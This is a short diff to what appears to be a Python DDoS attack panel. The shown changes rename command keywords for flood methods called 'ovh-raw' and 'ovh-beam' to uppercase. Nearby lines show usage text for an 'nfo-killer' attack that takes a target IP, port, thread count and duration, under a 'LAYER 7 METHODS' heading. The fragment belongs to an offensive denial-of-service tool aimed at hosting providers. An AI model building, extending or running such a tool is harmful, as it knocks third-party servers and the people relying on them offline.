@@ -360,7 +360,7 @@ def main():
                 print('Usage: nfo-killer <ip> <port> <threads> <time>')
                 print('Example: nfo-killer 1.1.1.1 80 850 60')
 
-        elif "ovh-raw" in cnc:
+        elif "OVH-RAW" in cnc:
             try:
                 method = cnc.split()[1]
                 ip = cnc.split()[2]
@@ -453,7 +453,7 @@ def main():
 
 # LAYER 7 METHODS
  
-        elif "ovh-beam" in cnc:
+        elif "OVH-BEAM" in cnc:
             try:
                 method = cnc.split()[1]
                 ip = cnc.split()[2]
